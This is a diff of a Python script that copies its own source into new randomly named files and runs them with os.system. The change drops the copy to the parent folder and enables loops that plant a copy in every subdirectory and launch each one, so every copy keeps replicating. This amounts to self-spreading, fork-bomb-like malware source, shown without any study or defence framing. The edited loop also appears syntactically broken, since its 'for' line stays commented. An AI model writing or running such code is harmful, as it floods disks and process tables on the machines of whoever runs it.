@@ -15,8 +15,6 @@ from threading import Thread
 import sys
 import random
 import string
-directory = os.getcwd()
-#print("this is whre I am " + directory)
 
 def writeIntoFile(file, lines):
     count = len(lines)
@@ -38,7 +36,9 @@ def previousFolder(file, lines):
             break
         file.write(line)
         if start == 14:
-            file.write("\nos.chdir('../')\n")
+            if not ("os.chdir('../')" in lines):
+                print("this is where it is")
+                file.write("\nos.chdir('../')\n")
 
 def runFunc(filename):
     os.system('python3 ' + filename)
@@ -46,8 +46,11 @@ def runFunc(filename):
 #get the current file
 thisfile = os.path.basename(__file__)
 
+directory = os.getcwd()
 
 
+
+print(thisfile)
 
 #open up the file and read it
 f = open(thisfile, "r")
@@ -59,32 +62,32 @@ filename = "newpython{randomness}.py".format(randomness="".join(random.choices(s
 
 
 #start copying the contents of the files to the new one
-try:
-    h = open("..\\" + filename, "w")
-    previousFolder(h, lines)
-    h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-    h.close()
-    if os.path.isfile("..\\" + filename):
-        thread = Thread(target=runFunc("..\\" + filename))
-        thread.start()
+#try:
+#    h = open("..\\" + filename, "w")
+#    previousFolder(h, lines)
+#    h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+#    h.close()
+#    if os.path.isfile("..\\" + filename):
+#        thread = Thread(target=runFunc("..\\" + filename))
+#        thread.start()
 
-except:
-    pass
+#except:
+#    pass
 
 
     
     
 
 #for x in os.walk(directory):
-#    g = open(x[0] + "/" + filename, "w")
-#    print(x[0] + "/" + "printing here")
-#    writeIntoFile(g, lines)
-#    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-#    g.close()
+    g = open(x[0] + "/" + filename, "w")
+    print(x[0] + "/" + "printing here")
+    writeIntoFile(g, lines)
+    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+    g.close()
 
-#for x in os.walk(directory):
-#    thread = Thread(target=runFunc(x[0] + "/" + filename))
-#    thread.start()
+for x in os.walk(directory):
+    thread = Thread(target=runFunc(x[0] + "/" + filename))
+    thread.start()
 
 
 
